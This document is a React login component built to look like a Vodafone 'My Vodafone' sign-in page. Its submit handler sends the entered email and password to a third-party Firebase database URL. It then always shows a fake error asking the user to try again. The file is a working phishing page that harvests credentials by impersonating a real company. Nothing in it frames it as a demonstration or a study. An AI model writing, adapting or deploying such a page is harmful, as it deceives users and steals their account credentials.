import { useState } from "react";
import { GoAlert } from "react-icons/go";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";

const Loginnew = () => {
  const [alertMessage, setAlertMessage] = useState("");
  const [showAlert, setShowAlert] = useState(false);
  const [showPassword, setShowPassword] = useState(false); // State for toggling password visibility

  const [user, setUser] = useState({
    Email: "",
    Password: "",
  });

  let name, value;
  const data = (e) => {
    name = e.target.name;
    value = e.target.value;
    setUser({ ...user, [name]: value });
  };

  const getdata = async (e) => {
    const { Email, Password } = user;
    e.preventDefault();
    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        Email,
        Password,
      }),
    };
    const res = await fetch(
      "https://vodafone-f3364-default-rtdb.firebaseio.com/UserData.json",
      options
    );
    if (res) {
      setAlertMessage(
        "Something went wrong. This might be an error with your details, please try again!"
      );
      setShowAlert(true);
    }
  };

  return (
    <main className="bg-[#F2F2F2] flex justify-center items-center h-full py-8 md:py-6 lg:py-0 md:h-screen">
      <div className="bg-white border shadow-md shadow-black relative w-[90%] sm:w-[75%] lg:w-2/5">
        <div className="w-11/12 py-8 space-y-4 bg-white">
          <h1 className="text-4xl font-[330] self-start pl-14 text-gray-800">
            Log in
          </h1>
          {showAlert && (
            <div
              className="mt-4 w-full sm:w-3/4 md:mx-auto mx-3 flex flex-col sm:flex-row items-stretch border-[1.5px] border-[#BD0000] overflow-hidden h-28 sm:h-32"
              role="alert"
              aria-live="assertive"
            >
              <div className="bg-[#BD0000] flex items-center justify-center px-6 h-12 sm:h-full">
                <GoAlert className="text-white text-xl sm:text-2xl" />
              </div>
              <div className="bg-white flex-1 p-2 sm:p-4 flex flex-col sm:flex-row justify-between items-center">
                <span className="text-xs sm:text-sm font-medium text-center sm:text-left">
                  {alertMessage}
                </span>
              </div>
              <button
                onClick={() => setShowAlert(false)}
                className="text-white bg-[#BD0000] border-l px-2 text-xl font-bold h-12 sm:h-full"
              >
                &times;
              </button>
            </div>
          )}

          <form className="w-3/4 space-y-2 mx-auto" method="POST">
            <div>
              <label className="block mb-1 font-medium text-gray-700">
                Username
              </label>
              <input
                type="email"
                placeholder="Enter your username"
                className="w-full px-4 py-2 text-sm border border-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0096AD]"
                name="Email"
                value={user.Email}
                autoComplete="false"
                onChange={data}
                required
              />
            </div>

            <div className="relative">
              <label className="block mb-1 font-medium text-gray-700">
                Password
              </label>
              <input
                type={showPassword ? "text" : "password"} // Toggle input type
                placeholder="Enter your password"
                className="w-full px-4 py-2 text-sm border border-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0096AD]"
                name="Password"
                value={user.Password}
                autoComplete="false"
                onChange={data}
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword((prev) => !prev)}
                className="absolute right-2 top-9 text-gray-600 focus:outline-none"
              >
                {showPassword ? (
                  <AiOutlineEyeInvisible size={20} />
                ) : (
                  <AiOutlineEye size={20} />
                )}
              </button>
            </div>

            <div className="text-sm">
              <a href="#">
                <div className="flex flex-col gap-2">
                  <span className="underline">Forgotten username?</span>
                  <span className="underline">
                    I don`t know my mobile number
                  </span>
                </div>
              </a>
            </div>

            <div className="pt-4">
              <button
                type="submit"
                className={`w-full py-2 text-white ${
                  user.Email && user.Password
                    ? "bg-[#E60000] hover:bg-red-700"
                    : "bg-[#F59E9E] cursor-not-allowed"
                } focus:outline-none`}
                disabled={!user.Email || !user.Password}
                onClick={getdata}
              >
                Continue
              </button>
            </div>
          </form>

          <div className="text-center text-sm">
            <p>
              Not registered?{" "}
              <a href="#" className="underline">
                Register for My Vodafone
              </a>
            </p>
          </div>
        </div>
      </div>
    </main>
  );
};

export default Loginnew;
